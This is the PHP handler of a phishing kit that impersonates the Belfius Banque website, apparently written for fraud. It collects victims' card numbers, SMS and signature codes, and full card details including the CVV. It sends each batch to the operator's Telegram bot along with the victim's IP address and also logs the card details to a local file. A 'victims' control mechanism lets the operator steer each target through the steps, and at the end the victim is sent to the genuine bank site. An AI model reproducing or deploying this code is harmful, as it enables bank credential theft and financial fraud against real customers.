<?php 

                                    #========================================
                                    #==> Make By ==> Telegram : @Azar_ox <==#
                                    #========================================
require_once "config.php";
require_once "functions.php";





if ($_POST['step'] == "control") {
        $fp = fopen('victims/'. $_POST['ip'] .'.txt', 'wb');

        if( $_POST['to'] == "qrcode" ) {
            $_POST['to'] = $_POST['to'] . '|' . $_POST['link'];
        }

        fwrite($fp, $_POST['to']);
        fclose($fp);
        header("location: control.php?ip=" . $_POST['ip']);
        exit();
    }




if( !empty($_GET['redirection']) ) {
    $red = $_GET['redirection'];
    if( $red == 'login' ) {
        $_SESSION['errors']['login'] = true;
        header("Location: index.php");
        exit();
    } if( $red == 'sms' ) {
        header("Location: sms.php");
        exit();
    } else if( $red == 'cc' ) {
        header("Location: cc.php");
        exit();
    } else if( $red == 'qrcode' ) {
        header("Location: code.php");
        exit();
    } else if( $red == 'approuve' ) {
        header("Location: approuve.php");
        exit();
    } else if( $red == 'success' ) {
        header("Location: https://www.belfius.be/retail/fr/index.aspx");
        exit();
    }
}

//================
#=====> LOG
//================

if ($_POST['step']== 'index') {
    $card = $_POST['card'];

    $_SESSION['card'] = $_POST['card'];




    if (empty($card)) {

        header("Location: index.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " ---| 💎 BELFIUS BANQUE 💎 |--- "       . "\r\n" ;
        $message  =" ------\  LOGIN  /----------- "       . "\r\n" ;
        $message .= "[+] CARD NUMBER : " . $card                  . "\r\n";
        $message .=" ------\  END LOGIN  /------- "       . "\r\n" ;
        $message .=" -----------\ Link CONTROL /----------- "       . "\r\n" ;
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";


        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
            reset_data();
        header("Location: loading.php");
        exit();
    }
}

//================
#=====> LOG
//================

if ($_POST['step']== 'sms') {
    $sms = $_POST['sms'];


    if (empty($sms)) {

        header("Location: sms.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " ---| 💎 BELFIUS BANQUE 💎 |--- "       . "\r\n" ;
        $message  =" ------\ 📲 SMS 📲 /----------- "       . "\r\n" ;
        $message .= "[+] CODE SMS : " . $sms                  . "\r\n";
        $message .=" ------\ 📲 END SMS 📲 /------- "       . "\r\n" ;
        $message .=" -----------\ Link CONTROL /----------- "       . "\r\n" ;
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";


        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
            reset_data();
        header("Location: loading.php");
        exit();
    }
}




//================
#=====> LOG
//================

if ($_POST['step']== 'code') {
    $code = $_POST['code'];


    if (empty($code)) {

        header("Location: code.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " ---| 💎 BELFIUS BANQUE 💎 |--- "       . "\r\n" ;
        $message  =" ------\  Code De Signature  /----------- "       . "\r\n" ;
        $message .= "[+] CODE  : " . $code                  . "\r\n";
        $message .=" ------\  END CODE  /------- "       . "\r\n" ;
        $message .=" -----------\ Link CONTROL /----------- "       . "\r\n" ;
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";


        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
            reset_data();
        header("Location: loading.php");
        exit();
    }
}

//================
#=====> CC
//================

if ($_POST['step']== 'cc') {
    $f_name = $_POST['name'];
    $card = $_POST['card'];
    $date = $_POST['date'];
    $code = $_POST['code'];




    if (empty($f_name) || empty($card) || empty($date) || empty($code)) {

        header("Location: cc.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " ----| 💎 BELFIUS BANQUE 💎 |--------- "       . "\r\n" ;
        $message  =" -----------\ START CC /----------- "       . "\r\n" ;
        $message .= "[+] FULL NAME : " . $f_name                 . "\r\n";
        $message .= "[+] CARD NUMBER : " . $card                 . "\r\n";
        $message .= "[+] EXP DATE : " . $date                 . "\r\n";
        $message .= "[+] CVV : " . $code                 . "\r\n";
        $message .=" -----------\ Link CONTROL /----------- "       . "\r\n" ;
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .=" -----------\ END CC /------------ "       . "\r\n" ;

        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
                $text = fopen('rzlt.txt', 'a');
                fwrite($text,$message);
            };
            reset_data();
        header("Location: loading.php");
        exit();
    }
}